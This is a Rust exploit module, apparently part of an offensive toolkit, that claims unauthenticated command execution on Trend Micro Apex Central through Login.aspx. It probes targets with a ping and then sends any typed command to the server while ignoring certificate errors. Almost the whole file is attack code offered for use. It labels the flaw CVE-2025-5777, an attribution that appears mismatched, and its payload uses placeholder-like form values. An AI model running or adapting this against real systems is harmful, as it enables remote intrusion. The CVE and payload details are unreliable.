use anyhow::{anyhow, Context, Result};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_default, prompt_required, normalize_target};

const DEFAULT_TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Trend Micro Apex Central RCE (CVE-2025-5777)           ║".cyan());
    println!("{}", "║    Unauthenticated Command Injection via Login.aspx       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    // Normalize target URL
    let base_url = if target.is_empty() {
        prompt_required("Target URL (e.g., http://192.168.1.100)")?
    } else {
        normalize_target(target)?
    };
    
    let base_url = if base_url.starts_with("http://") || base_url.starts_with("https://") {
        base_url
    } else {
        format!("http://{}", base_url)
    };
    let base_url = base_url.trim_end_matches('/').to_string();

    println!("[*] Target: {}", base_url);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    loop {
        println!("\n{}", "Select mode:".cyan());
        println!("1. Check Vulnerability (Ping localhost)");
        println!("2. Execute Custom Command");
        println!("3. Exit");
        
        let choice = prompt_default("Select option", "1")?;

        match choice.as_str() {
            "1" => check_vulnerability(&client, &base_url).await?,
            "2" => exploit_command(&client, &base_url).await?,
            "3" => break,
            _ => println!("{}", "Invalid choice".red()),
        }
    }

    Ok(())
}

async fn check_vulnerability(client: &Client, target: &str) -> Result<()> {
    println!("[*] Checking for vulnerability using ping command...");
    
    let cmd = "ping -c 3 127.0.0.1"; 
    let output = send_payload(client, target, cmd).await?;

    if output.contains("ping statistics") || output.contains("bytes from") || output.contains("ttl=") {
        println!("{}", "[+] Target is VULNERABLE! (Ping output detected)".green().bold());
        println!("Output snippet:\n{}", output.lines().take(5).collect::<Vec<_>>().join("\n"));
    } else if output.contains("error") || output.contains("Error") {
        println!("{}", "[-] Target returned error - might not be vulnerable.".yellow());
    } else {
        println!("{}", "[-] Inconclusive - output not reflected or target patched.".yellow());
        println!("Response length: {} bytes", output.len());
    }

    Ok(())
}

async fn exploit_command(client: &Client, target: &str) -> Result<()> {
    let cmd = prompt_required("Enter command to execute")?;

    if cmd.is_empty() {
        return Ok(());
    }

    println!("[*] Sending payload...");
    let output = send_payload(client, target, &cmd).await?;
    
    println!("{}", "[+] Response:".green());
    if output.is_empty() {
        println!("(empty response - command may have executed blindly)");
    } else {
        println!("{}", output);
    }

    Ok(())
}

async fn send_payload(client: &Client, target_url: &str, command: &str) -> Result<String> {
    let vulnerable_endpoint = "/TrendMicro/EndpointBaseCamp/UI/Login.aspx";
    let full_url = format!("{}{}", target_url, vulnerable_endpoint);

    // Construct payload matching the Python PoC format
    let body = format!(
        "__VIEWSTATEGENERATOR=ABC123&__EVENTVALIDATION=xyz&cmd={}",
        urlencoding::encode(command)
    );

    let res = client.post(&full_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .body(body)
        .send()
        .await
        .context("Failed to send request")?;

    let status = res.status();
    let text = res.text().await.context("Failed to read response body")?;

    if status.as_u16() >= 500 {
        return Err(anyhow!("Server error: {}", status));
    }

    Ok(text)
}
